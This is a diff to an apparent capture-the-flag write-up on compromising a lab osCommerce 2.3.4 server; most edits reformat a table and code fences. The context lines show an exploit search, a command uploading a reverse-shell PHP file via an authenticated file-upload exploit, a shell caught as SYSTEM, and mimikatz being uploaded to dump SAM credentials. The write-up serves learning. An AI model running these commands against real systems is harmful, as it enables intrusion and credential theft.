@@ -90,18 +90,18 @@ We know the page is running **osCommerce v2.3.4** so let's see if there are any 
 `searchsploit osCommerce 2.3.4`
 
 ```bash
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                           |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-osCommerce 2.3.4 - Multiple Vulnerabilities                                                                              | php/webapps/34582.txt
-osCommerce 2.3.4.1 - 'currency' SQL Injection                                                                            | php/webapps/46328.txt
-osCommerce 2.3.4.1 - 'products_id' SQL Injection                                                                         | php/webapps/46329.txt
-osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                                                          | php/webapps/46330.txt
-osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting                                                             | php/webapps/49103.txt
-osCommerce 2.3.4.1 - Arbitrary File Upload                                                                               | php/webapps/43191.py
-osCommerce 2.3.4.1 - Remote Code Execution                                                                               | php/webapps/44374.py
-osCommerce 2.3.4.1 - Remote Code Execution (2)                                                                           | php/webapps/50128.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+---------------------------------------------------------------- -----------------------
+ Exploit Title                                                  |  Path
+---------------------------------------------------------------- -----------------------
+osCommerce 2.3.4 - Multiple Vulnerabilities                     | php/webapps/34582.txt
+osCommerce 2.3.4.1 - 'currency' SQL Injection                   | php/webapps/46328.txt
+osCommerce 2.3.4.1 - 'products_id' SQL Injection                | php/webapps/46329.txt
+osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                 | php/webapps/46330.txt
+osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting    | php/webapps/49103.txt
+osCommerce 2.3.4.1 - Arbitrary File Upload                      | php/webapps/43191.py
+osCommerce 2.3.4.1 - Remote Code Execution                      | php/webapps/44374.py
+osCommerce 2.3.4.1 - Remote Code Execution (2)                  | php/webapps/50128.py
+---------------------------------------------------------------- -----------------------
 ```
 
 I start off downloading the first RCE **44374.py**:
@@ -180,7 +180,7 @@ I run the exploit with the following command which uploads a reverse shell to th
 
 `python2 43191.py -u http://10.10.50.2:8080/oscommerce-2.3.4 --auth=jdotinfo:password -f multi-os-rev-shell.php`
 
-```
+```bash
 [+] Authentication successful
 [+] Successfully prepared the exploit and created a new newsletter with nID 3
 [+] Successfully locked the newsletter. Now attempting to upload..
@@ -191,7 +191,7 @@ I run the exploit with the following command which uploads a reverse shell to th
 
 And navigating over to the provided URL gives us a shell on the box as system so we don't even need to escalate:
 
-```
+```bash
 listening on [any] 4444 ...
 connect to [<MY IP>] from (UNKNOWN) [10.10.50.2] 49611
 SOCKET: Shell has connected!
@@ -208,7 +208,7 @@ nt authority\system
 
 Changing over to the administrators desktop shows us the root flag:
 
-```
+```bash
  Directory of C:\Users\Administrator\Desktop
 
 11/27/2019  07:15 PM    <DIR>          .
@@ -226,7 +226,7 @@ I upload an older 32 bit version of **mimikatz 2.1.1** to the system using the s
 
 `python2 43191.py -u http://10.10.50.2:8080/oscommerce-2.3.4 --auth=jdotinfo:password -f mimikatz32.exe`
 
-```
+```bash
 [+] Authentication successful
 [+] Successfully prepared the exploit and created a new newsletter with nID 4
 [+] Successfully locked the newsletter. Now attempting to upload..
@@ -237,7 +237,7 @@ I upload an older 32 bit version of **mimikatz 2.1.1** to the system using the s
 
 You can find the uploaded file in this directory:
 
-```
+```bash
  Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\admin
 
 04/06/2022  07:57 PM         1,250,056 mimikatz32.exe
@@ -245,7 +245,7 @@ You can find the uploaded file in this directory:
 
 Running mimikatz and providing it the `lsadump::sam` command:
 
-```
+```bash
 C:\xampp\htdocs\oscommerce-2.3.4\catalog\admin>mimikatz32.exe
 
   .#####.   mimikatz 2.1.1 (x86) #17763 Dec  9 2018 23:56:27
